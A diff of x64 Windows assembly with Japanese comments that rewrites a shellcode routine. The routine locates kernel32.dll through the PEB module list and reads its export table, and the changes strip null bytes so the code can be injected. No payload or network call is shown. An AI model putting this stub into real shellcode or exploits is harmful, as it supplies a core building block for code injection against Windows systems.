@@ -3,9 +3,12 @@ global _start
 
 _start:
 ; kernel32.dllのアドレスを取得
+    ; rcxを0にする
+    xor rcx, rcx
     ; Ptr64 _PEB を取得
     ; gsはTEBのアドレスが設定されている
-    mov rax, gs:[0x60]
+    ; 単に[0x60]だとコードに\x00が含まれてしまうため[rcx + 0x60]としている
+    mov rax, gs:[rcx + 0x60]
 
     ; Ptr64 _PEB_LDR_DATA を取得
     mov rax, [rax + 0x18]
@@ -18,14 +21,16 @@ _start:
     ; mov r10, [rax + 0x20]
 
     ; InMemoryOrderModuleList->Flink
-    mov rax, [rax]
+    ; 単に[rax]だとコードに\x00が含まれてしまうため[rcx + rax]としている
+    mov rax, [rcx + rax]
 
     ; ntdll.llのアドレスを取得する場合
     ; r11 = ntdll.dllのアドレス
     ; mov r11, [rax + 0x20]
 
     ; InMemoryOrderModuleList->Flink
-    mov rax, [rax]
+    ; 単に[rax]だとコードに\x00が含まれてしまうため[rcx + rax]としている
+    mov rax, [rcx + rax]
     ; rbx = kernel32.dllのアドレス
     mov rbx, [rax + 0x20]
 
@@ -36,16 +41,26 @@ _start:
     ; mov r12, [rax + 0x20]
 
 
-; Get kernel32.dll &ExportTable
-    xor rcx, rcx            ; rcxを0にする
-    mov r8, rbx             ; copy &kernel32 to r8
-    mov ebx, [rbx + 0x3C]   ; &kernel32 >e_lfanew offset
-    add rbx, r8             ; &kernel32 PE Header
+; kernel32.dllのエクスポート情報(IMAGE_EXPORTS_DIRECTORY)を取得
+    ; r8にkernel32.dllのアドレスをコピー
+    mov r8, rbx
 
-    add cx, 0x8811
-    shr rcx, 0x8
-    mov edx, [rbx + rcx]   ; RVA ExportTable = &kernel32 PE Header + 0x88
-    add rdx, r8             ; &ExportTable = &kernel32 + RVA ExportTable
+    ; kernel32.dllのPEヘッダーへのオフセットを取得
+    ; ebx = e_flanew
+    mov ebx, [rbx + 0x3C]
+    ; kernel32.dllのPEヘッダーのアドレスを取得
+    ; rbx = e_flanew + kernel32.dllのアドレス
+    add rbx, r8
+
+    ; (rcxの下位1バイト)clにIMAGE_EXPORTS_DIRECTORYへのオフセット0x88をセット
+    ; 0x88 = 0x170(DOSヘッダーからのオフセット) - 0xE8(PEヘッダーへのオフセット)
+    mov cl, 0x88
+    ; IMAGE_EXPORTS_DIRECTORYへのオフセットを取得
+    ; edx = kernel32.dllのPEヘッダーのアドレス + 0x88
+    mov edx, [rbx + rcx]
+    ; IMAGE_EXPORTS_DIRECTORYのアドレスを取得
+    ; rdx = rdx(IMAGE_EXPORTS_DIRECTORYへのオフセット) + r8(kernel32.dllのアドレス)
+    add rdx, r8
 
 ; Get &AddressOfFunctions from Kernel32.dll ExportTable
     xor r10, r10            ; Clear r10
